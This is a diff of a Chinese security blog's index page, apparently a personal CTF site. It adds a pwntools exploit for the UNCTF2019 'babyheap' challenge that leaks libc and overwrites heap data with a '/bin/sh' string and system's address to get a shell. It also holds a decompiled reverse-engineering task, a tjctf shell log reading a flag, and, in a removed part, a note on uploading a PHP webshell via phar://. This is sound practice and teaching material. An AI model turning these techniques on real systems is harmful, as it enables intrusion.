@@ -248,6 +248,13 @@
 
               <time title="Created: 2019-11-11 23:00:11" itemprop="dateCreated datePublished" datetime="2019-11-11T23:00:11+08:00">2019-11-11</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-11-13 16:46:28" itemprop="dateModified" datetime="2019-11-13T16:46:28+08:00">2019-11-13</time>
+              </span>
 
           
             <span id="/posts/f35cc4fe/" class="post-meta-item leancloud_visitors" data-flag-title="rewriteup" title="Views">
@@ -276,7 +283,7 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>72</span>
+              <span>71</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
@@ -295,7 +302,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/undefined/">https://noone-hub.github.io/posts/undefined/</a> <br><strong>版权声明</strong>：转载请注明出处！</p>
+          <p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/f35cc4fe/">https://noone-hub.github.io/posts/f35cc4fe/</a> <br><strong>版权声明</strong>：转载请注明出处！</p>
       
     </div>
 
@@ -747,7 +754,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-11-10 16:46:17" itemprop="dateModified" datetime="2019-11-10T16:46:17+08:00">2019-11-10</time>
+                <time title="Modified: 2019-11-13 16:48:38" itemprop="dateModified" datetime="2019-11-13T16:48:38+08:00">2019-11-13</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -807,7 +814,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          此文章已被加密，需要输入密码访问。
+          <h1 id="unctf2019-pwn部分题解"><a href="#unctf2019-pwn部分题解" class="headerlink" title="unctf2019 pwn部分题解"></a>unctf2019 pwn部分题解</h1><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>easy，不讲了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'/tmp/tmp.spk5nTEvta/1910245db1406d3eedd'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(content)</span>:</span></span><br><span class="line">    c(<span class="number">1</span>)</span><br><span class="line">    sa(<span class="string">"Plz input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    c(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Plz input index: "</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"Plz input size: "</span>, str(size))</span><br><span class="line">    sa(<span class="string">"Plz input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Plz input index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">"Plz input index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="string">"a"</span>*<span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">"a"</span>*<span class="number">0x18</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    r(<span class="number">0x18</span>)</span><br><span class="line">    puts = uu64(r(<span class="number">6</span>))</span><br><span class="line">    lg(<span class="string">"addr"</span>, puts)</span><br><span class="line">    libc.address = puts - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    new(<span class="string">"a"</span>*<span class="number">0x10</span>)</span><br><span class="line">    payload = <span class="string">"/bin/sh;#\x00"</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x18</span>, <span class="string">"a"</span>)</span><br><span class="line">    payload += p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x20</span>, payload)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#free(0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/posts/89fa1574/#more" rel="contents">
@@ -970,7 +977,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/posts/3e78770/">
+    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/posts/8cd80461/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/photo.jpg">
@@ -984,135 +991,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/posts/3e78770/" class="post-title-link" itemprop="url">python爬虫学习1</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2019-11-01 03:14:36" itemprop="dateCreated datePublished" datetime="2019-11-01T03:14:36+08:00">2019-11-01</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-11-10 16:46:17" itemprop="dateModified" datetime="2019-11-10T16:46:17+08:00">2019-11-10</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index">
-                    <span itemprop="name">基础</span>
-                  </a>
-                </span>
-            </span>
-
-          
-            <span id="/posts/3e78770/" class="post-meta-item leancloud_visitors" data-flag-title="python爬虫学习1" title="Views">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">Views: </span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
-      </span>
-      <span class="post-meta-item-text">Valine: </span>
-    
-    <a title="valine" href="/posts/3e78770/#comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/posts/3e78770/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  <br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>3k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>3 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="爬虫第一天"><a href="#爬虫第一天" class="headerlink" title="爬虫第一天"></a>爬虫第一天</h1><h2 id="关于内容的思考"><a href="#关于内容的思考" class="headerlink" title="关于内容的思考"></a>关于内容的思考</h2><p>书里有两处遗漏</p><ol>
-<li><p>正则匹配不当</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link_craw(<span class="string">'http://example.python-scraping.com'</span>, <span class="string">'/places/default/(index|view)'</span>,user_agent=<span class="string">'BadCrawler'</span>)</span><br></pre></td></tr></table></figure>
-<p>这里应该是/place/default/这样的格式，因为re.match只匹配开头串，前面重复的部分也要写上</p>
-</li>
-<li><p>在requests这里讲解的时候代码少了个return html</p>
-</li>
-</ol>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/posts/3e78770/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-    <div>
-      
-    </div>
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/posts/f605762/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/photo.jpg">
-      <meta itemprop="name" content="NoOne">
-      <meta itemprop="description" content="One people that no one know">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="NoOne-hub">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/posts/f605762/" class="post-title-link" itemprop="url">web安全训练</a>
+            <a href="/posts/8cd80461/" class="post-title-link" itemprop="url">随便做的练习</a>
         </h2>
 
         <div class="post-meta">
@@ -1144,7 +1023,7 @@
             </span>
 
           
-            <span id="/posts/f605762/" class="post-meta-item leancloud_visitors" data-flag-title="web安全训练" title="Views">
+            <span id="/posts/8cd80461/" class="post-meta-item leancloud_visitors" data-flag-title="随便做的练习" title="Views">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
@@ -1159,8 +1038,8 @@
       </span>
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/posts/f605762/#comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/posts/f605762/" itemprop="commentCount"></span>
+    <a title="valine" href="/posts/8cd80461/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/posts/8cd80461/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -1170,14 +1049,14 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>5.9k</span>
+              <span>2.4k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="fa fa-clock-o"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>5 mins.</span>
+              <span>2 mins.</span>
             </span>
 
         </div>
@@ -1189,10 +1068,10 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="安恒训练赛"><a href="#安恒训练赛" class="headerlink" title="安恒训练赛"></a>安恒训练赛</h1><h2 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h2><p><span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDA5L2luZGV4LnBocD91cmw9dXBsb2Fk" title="http://114.55.36.69:8009/index.php?url=upload">http://114.55.36.69:8009/index.php?url=upload<i class="fa fa-external-link"></i></span></p><p>upload很明显的文件上传，查了下是php伪协议<br>看到zip于是猜测是phar://伪协议读取。</p><p>于是写个小马打包成zip文件传上去。</p><p>例如我写的是south.php。</p><p>然后压缩成south.zip，那么需要访问以下链接。</p>
+          <h1 id="writeup-1-练习"><a href="#writeup-1-练习" class="headerlink" title="writeup-1-练习"></a>writeup-1-练习</h1><h2 id="简单的re"><a href="#简单的re" class="headerlink" title="简单的re"></a>简单的re</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+0h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+60h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"input:"</span>, envp);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v10, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v10);</span><br><span class="line">  v3 = <span class="number">34</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (<span class="keyword">int</span> *)&amp;v10;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = *v5;</span><br><span class="line">      ++v5;</span><br><span class="line">      v7 = ~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x80808080</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v7 );</span><br><span class="line">    <span class="keyword">if</span> ( !(~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x8080</span>) )</span><br><span class="line">      v7 &gt;&gt;= <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x8080</span>) )</span><br><span class="line">      v5 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v5 + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= (<span class="keyword">char</span> *)v5 - __CFADD__((_BYTE)v7, (_BYTE)v7) - <span class="number">3</span> - (<span class="keyword">char</span> *)&amp;v10 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *((_BYTE *)&amp;v10 + i) ^= v3++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;szCmp, &amp;v10, <span class="number">0x16</span>uLL) )</span><br><span class="line">    _printf_chk(<span class="number">1L</span>L, <span class="string">"right\n"</span>, v8);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    _printf_chk(<span class="number">1L</span>L, <span class="string">"wrong\n"</span>, v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/posts/f605762/#more" rel="contents">
+              <a class="btn" href="/posts/8cd80461/#more" rel="contents">
                 Read more &raquo;
               </a>
             </div>
@@ -1340,7 +1219,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/posts/8cd80461/">
+    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/posts/46708f4d/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/photo.jpg">
@@ -1354,7 +1233,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/posts/8cd80461/" class="post-title-link" itemprop="url">随便做的练习</a>
+            <a href="/posts/46708f4d/" class="post-title-link" itemprop="url">tjctf2019比赛</a>
         </h2>
 
         <div class="post-meta">
@@ -1386,7 +1265,7 @@
             </span>
 
           
-            <span id="/posts/8cd80461/" class="post-meta-item leancloud_visitors" data-flag-title="随便做的练习" title="Views">
+            <span id="/posts/46708f4d/" class="post-meta-item leancloud_visitors" data-flag-title="tjctf2019比赛" title="Views">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
@@ -1401,8 +1280,8 @@
       </span>
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/posts/8cd80461/#comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/posts/8cd80461/" itemprop="commentCount"></span>
+    <a title="valine" href="/posts/46708f4d/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/posts/46708f4d/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -1412,14 +1291,14 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>2.4k</span>
+              <span>455</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="fa fa-clock-o"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>2 mins.</span>
+              <span>1 mins.</span>
             </span>
 
         </div>
@@ -1431,10 +1310,138 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="writeup-1-练习"><a href="#writeup-1-练习" class="headerlink" title="writeup-1-练习"></a>writeup-1-练习</h1><h2 id="简单的re"><a href="#简单的re" class="headerlink" title="简单的re"></a>简单的re</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+0h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+60h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"input:"</span>, envp);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v10, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v10);</span><br><span class="line">  v3 = <span class="number">34</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (<span class="keyword">int</span> *)&amp;v10;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = *v5;</span><br><span class="line">      ++v5;</span><br><span class="line">      v7 = ~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x80808080</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v7 );</span><br><span class="line">    <span class="keyword">if</span> ( !(~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x8080</span>) )</span><br><span class="line">      v7 &gt;&gt;= <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x8080</span>) )</span><br><span class="line">      v5 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v5 + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= (<span class="keyword">char</span> *)v5 - __CFADD__((_BYTE)v7, (_BYTE)v7) - <span class="number">3</span> - (<span class="keyword">char</span> *)&amp;v10 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *((_BYTE *)&amp;v10 + i) ^= v3++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;szCmp, &amp;v10, <span class="number">0x16</span>uLL) )</span><br><span class="line">    _printf_chk(<span class="number">1L</span>L, <span class="string">"right\n"</span>, v8);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    _printf_chk(<span class="number">1L</span>L, <span class="string">"wrong\n"</span>, v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+          <h1 id="Printf"><a href="#Printf" class="headerlink" title="Printf"></a>Printf</h1><p>Welcome to the brand new Security Consultants Inc. portal!<br>What would you like to do?<br>1.) View the Team!<br>2.) Check the date.<br>3.) Sign up for our newsletter!<br>4.) Report a bug.<br>x.) Exit.<br>Thanks for signing up for our newsletter!<br>Please enter your email address below:<br>I have your email as:<br>sh;#                                                           �                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             �aaaaaaaJ `sh: 1: Is: not found<br>$<br>Great! I have your information down as:<br>Name: Evan Shi<br>sh: 1: Email:: not found<br>$ cat flag.txt<br>tjctf{p0lygl0t_m0r3_l1k3_p0lynot}$  </p>
           <!--noindex-->
             <div class="post-button">
